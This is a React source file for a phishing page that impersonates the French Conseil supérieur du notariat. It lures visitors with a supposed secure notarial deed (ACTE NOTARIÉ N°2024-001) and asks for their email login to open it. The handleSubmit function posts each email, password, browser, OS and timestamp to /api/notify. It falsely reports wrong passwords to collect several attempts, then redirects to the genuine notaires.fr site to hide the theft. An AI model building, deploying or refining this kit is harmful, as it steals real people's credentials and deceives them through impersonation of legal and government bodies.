'use client'

import React, { useState, useRef } from 'react';
import './LoginForm.css';
import { validateEmail, getBrowserInfo, getOSInfo, getCurrentTime } from '../utils/helpers';

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [showAttemptCounter, setShowAttemptCounter] = useState(false);
  
  const passwordInputRef = useRef(null);
  const maxAttempts = parseInt(process.env.NEXT_PUBLIC_MAX_ATTEMPTS || '5');
  const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://www.notaires.fr/fr';

  const shakeElement = (element) => {
    if (element) {
      element.style.animation = 'shake 0.5s ease-in-out';
      setTimeout(() => {
        element.style.animation = '';
      }, 500);
    }
  };

  const handleEmailChange = (e) => {
    const newEmail = e.target.value;
    setEmail(newEmail);
    
    if (validateEmail(newEmail)) {
      setEmailError('');
      setShowPasswordField(true);
      setTimeout(() => {
        passwordInputRef.current?.focus();
      }, 100);
    } else {
      setShowPasswordField(false);
      setShowAttemptCounter(false);
      setPassword('');
    }
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    if (passwordError) {
      setPasswordError('');
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateEmail(email)) {
      setEmailError('Veuillez entrer une adresse e-mail valide.');
      shakeElement(document.querySelector('.email-input'));
      return;
    }
    
    if (!password.trim()) {
      setPasswordError('Veuillez entrer votre mot de passe.');
      shakeElement(passwordInputRef.current);
      return;
    }
    
    setIsLoading(true);
    
    const browser = getBrowserInfo();
    const os = getOSInfo();
    const currentTime = getCurrentTime();
    
    await fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, browser, os, currentTime, attempt: attemptCount + 1, maxAttempts }),
    });
    
    setIsLoading(false);
    
    const newAttemptCount = attemptCount + 1;
    setAttemptCount(newAttemptCount);
    setShowAttemptCounter(true);
    
    if (newAttemptCount < maxAttempts) {
      setPasswordError('Mot de passe incorrect. Veuillez réessayer.');
      shakeElement(passwordInputRef.current);
      setPassword('');
    } else {
      setPasswordError('Accès autorisé. Redirection en cours...');
      const errorElement = document.querySelector('.password-error');
      if (errorElement) {
        errorElement.style.color = 'green';
      }
      
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 2000);
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="container">
      <div className="logo">
        <img 
          src="https://etude-laidet.notaires.fr/wp-content/uploads/2018/07/logo-notaire-removebg-preview.webp" 
          alt="Notaires de France"
        />
      </div>
      
      <p className="title">Vous avez reçu un fichier sécurisé</p>
      
      <div className="file-info">
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" 
          alt="PDF" 
          width="40"
        />
        <strong>ACTE NOTARIÉ N°2024-001</strong>
      </div>
      
      <p className="description">
        Pour lire le document veuillez entrer les identifiants de messagerie 
        auxquels ce fichier a été envoyé.
      </p>
      
      <form onSubmit={handleSubmit}>
        <div className="input-field">
          <label htmlFor="email">Adresse email :</label>
          <input
            type="email"
            id="email"
            className="email-input"
            value={email}
            onChange={handleEmailChange}
            placeholder="exemple@domaine.com"
            required
            disabled={isLoading}
          />
          {emailError && <span className="error-message">{emailError}</span>}
        </div>
        
        {showPasswordField && (
          <div className="input-field password-container">
            <label htmlFor="password">Mot de passe :</label>
            <div className="password-wrapper">
              <input
                ref={passwordInputRef}
                type={showPassword ? "text" : "password"}
                id="password"
                value={password}
                onChange={handlePasswordChange}
                placeholder="Entrez votre mot de passe"
                required
                disabled={isLoading}
              />
              <button 
                type="button"
                className="toggle-password"
                onClick={togglePasswordVisibility}
              >
                {showPassword ? "👁️" : "👁️‍🗨️"}
              </button>
            </div>
            {passwordError && <span className="error-message password-error">{passwordError}</span>}
          </div>
        )}
        
        <button 
          type="submit" 
          className="btn"
          disabled={isLoading || !showPasswordField}
        >
          {isLoading ? 'Vérification en cours...' : 'Lire le Document'}
        </button>
      </form>
      
      {isLoading && (
        <div className="loading">
          Vérification des identifiants en cours...
        </div>
      )}
      
      {showAttemptCounter && !isLoading && (
        <div className="attempt-counter">
          Tentative {attemptCount} sur {maxAttempts}
        </div>
      )}
      
      <div className="security-notice">
        Ce document est protégé par des mesures de sécurité conformes à la 
        réglementation en vigueur.
      </div>
      
      <div className="footer">
        <p>© Copyright Conseil supérieur du notariat 2025</p>
        <div className="footer-logos">
          <img src="https://www.notaires.fr/themes/custom/not/assets/img/logos/banque.jpg" alt="Banque" />
          <img src="https://www.cours-appel.justice.fr/sites/default/files/2023-01/logo%20minist%C3%A8re%20de%20la%20justice%202023.PNG" alt="Ministère de la Justice" />
          <img src="https://tribunauxdecommerce.fr/wp-content/uploads/2021/05/logo-cgjcf.png" alt="CGJCF" />
          <img src="https://www.lancermonentreprise.fr/medias/organismes/logo-greffe.jpg" alt="Greffe" />
        </div>
      </div>
    </div>
  );
};

export default LoginForm;